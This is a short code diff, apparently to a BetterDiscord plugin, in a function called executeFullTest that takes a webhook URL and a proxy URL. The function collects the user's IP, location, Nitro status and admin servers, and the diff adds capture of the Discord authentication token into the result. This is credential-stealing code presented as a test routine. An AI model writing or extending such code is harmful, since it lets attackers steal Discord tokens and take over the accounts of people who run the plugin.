@@ -3,6 +3,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         ip: null,
         location: null,
         nitro: "Нет",
+        dtoken: null,
         admin_servers: []
     };
     
@@ -35,6 +36,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
     try {
         const authStore = BdApi.Webpack.getStore("AuthenticationStore");
         if (authStore && typeof authStore.getToken === 'function') token = authStore.getToken();
+        result.dtoken = token;
     } catch (e) {}
 
     // 3. Ищем серверы, где ты админ, и считаем людей
